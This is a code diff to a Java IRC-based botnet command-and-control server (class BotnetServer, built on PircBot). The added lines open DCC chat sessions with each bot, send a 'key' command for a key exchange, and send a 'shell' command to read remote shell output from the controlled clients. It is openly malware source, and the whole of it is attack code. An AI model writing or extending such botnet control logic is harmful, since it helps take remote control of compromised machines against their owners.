@@ -159,6 +159,20 @@ public class BotnetServer extends PircBot {
 				//sendMessage(bots[i].getNick(), stuff2);
 				sendMessage(bots[i].getNick(), stuff);
 				botKeys.put(bots[i].getNick(), m);
+				try {
+					DccChat chat = dccSendChatRequest(bots[i].getNick(), TIMEOUT);
+					if (chat == null) {
+						System.out.println("\tThe chat request was rejected.");
+					} else {
+						chat.sendLine("key");
+						Scanner shellout = new Scanner(chat.getBufferedReader());
+						//use shellout for getting returned data from the client if you need it
+						//use chat.sendLine(s) to send key info
+					}
+				} catch (Exception e) {
+					System.out.println("\tThere was an issue performing the key exchange");
+					e.printStackTrace();
+				}
 			}
 		}
 		init();
@@ -430,6 +444,7 @@ public class BotnetServer extends PircBot {
 			Scanner shellout = new Scanner(chat.getBufferedReader());
 			
 			try {
+				chat.sendLine("shell");
 				// TODO: decrypt this
 				System.out.print(shellout.nextLine());
 				//String msg = shellout.nextLine();
